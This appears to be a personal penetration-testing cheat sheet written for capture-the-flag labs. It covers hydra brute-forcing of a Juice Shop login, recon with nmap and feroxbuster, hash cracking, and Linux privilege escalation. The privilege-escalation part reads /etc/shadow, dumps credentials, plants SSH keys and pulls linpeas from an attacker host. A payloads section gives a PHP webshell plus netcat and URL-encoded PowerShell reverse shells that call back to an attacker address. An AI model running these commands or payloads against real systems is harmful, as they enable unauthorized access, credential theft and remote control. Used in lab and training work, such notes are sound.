# InfoSec notes

## Hydra

### HTTP Post

Example: Brute-force `admin` login of the OWASP Juice-Shop

Authentication `POST` request looked like this in Browser DevTools

```shell
curl 'http://10.10.114.54/rest/user/login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://10.10.114.54/' -H 'Content-Type: application/json' -H 'Connection: keep-alive' -H 'Cookie: io=5yIoLc2JuE6AcrUbAAAA; language=en; cookieconsent_status=dismiss' --data-raw '{"email":"hello@example.com","password":"asdf"}'
```

with response 401 `Invalid email or password.`

This converts to `hydra` as follows

```bash
# -V verbose
# `-l admin@juice-sh.op` the admin's email
hydra -v -V -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt 10.10.114.54 http-post "/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid email or password."

# general layout (note: single user -l vs user list -L, same for password)
#  hydra -L <USER> -P <Password> <IP Address> http-post “<Login Endpoint>:<Request Body>:<Error Message>”
```

## Feroxbuster

`feroxbuster -u http://10.10.80.188 --no-recursion -vv --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt`

## Tools for cracking RSA

- [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
- [rsatool](https://github.com/ius/rsatool)

## Share files with Kali VM

[gofile](https://gofile.io/uploadFiles)

## GPG

```bash
gpg --import private.key
gpg --decrypt encrypted.file > plain.txt
```

## Hash cracking

```bash
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
python3 hash-id.py < HASH_FILE

gzip -d /usr/share/wordlists/rockyou.txt.gz
# Note: standard hash types might have prefix `raw-` e.g. format=raw-md5
sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=FORMAT HASH_FILE

john --list=formats | grep -i md5
```

## Resources

- [spawning a TTY shell in many languages](https://netsec.ws/?p=337)
- [unix binaries to bypass security](https://gtfobins.github.io/#+sudo)
- [file endings in linux](https://lauraliparulo.altervista.org/most-common-linux-file-extensions/)
- [pentestlab.blog privesc](https://pentestlab.blog/category/privilege-escalation/)
- [gtfobins](https://gtfobins.github.io/#)

## Recon + Privilege Escalation

In CTFs there is rarely any negative consequence, so going into full offensive is fine.

### external

- open/filtered ports
- services on ports
- find HTTP endpoints

```bash
# portscan + service detection
nmap -A -sV -p- $IP
# alternative with Metasploit
msfdb init
msfconsole
db_nmap -A -sv -p- $IP

# HTTP endpoints
curl $IP/robots.txt
feroxbuster -u http://10.10.80.188 --no-recursion -vv --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

### internal

i.e. after getting a shell on the target

- stabilize shell
  - `whoami`
  - add attacker's ssh key to `authorized_keys`
- system infos
- current sudo privileges
- services + processes
- service + package versions
- usernames + credentials
- files with SUID or SGID
- cronjobs

What we're looking for:

- root access
- credentials
- further vulnerabilities (with the ultimate goal of root access)

```bash
# system infos
hostnamectl
# alternative:
uname -a

# own permissions
sudo --list

# services + processes
less ~/.bash_history # also bashprofile, bashrc, bash_aliases
ps -ef

# versions
sudo -V
apt list --installed

# usernames + credentials
less /etc/passwd
less /etc/shadow
# with metasploit meterpreter
load kiwi
creds_all

# check for known vulnerabilities
searchsploit <systeminfo / services>

# backups, configs, logs
find / -type f -name '*.log' 2>/dev/null
find / -type f -name '*.bak' 2>/dev/null
find / -type f -name '*.conf' 2>/dev/null
# if everything fails to find the flag, search all file contents
find / -type f -exec cat {} \; | grep -E 'thm{'
find / -type f -perm -u=s 2>/dev/null

# cronjobs
cat /etc/crontab

# swiss-army knife
# on attacker machine
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
python3 -m http.server 8000
# on target machine
wget ${ATTACKER_IP}:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

## swiss-army knife 2 - LinEnum.sh
# analog to linpeas.sh
```

## Payloads

### PHP

#### Webshell

upload file to the server

`echo '<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>' > php-webshell.php`

#### Linux

**reverse shell**
`http://<RHOST>/uploads/php-webshell.php?cmd=nc <LHOST> <LPORT> -e /bin/bash`

#### Windows

**reverse shell**
exchange `LPORT`, `LHOST`, `RHOST`

```http
http://RHOST/uploads/php-webshell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<LHOST>%27%2C<LPORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

### RDP Remote Desktop Protocol

`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.1.202 /u:Administrator /p:'password'`
Note: it takes a while (~5min) on the VMs to initialize RDP
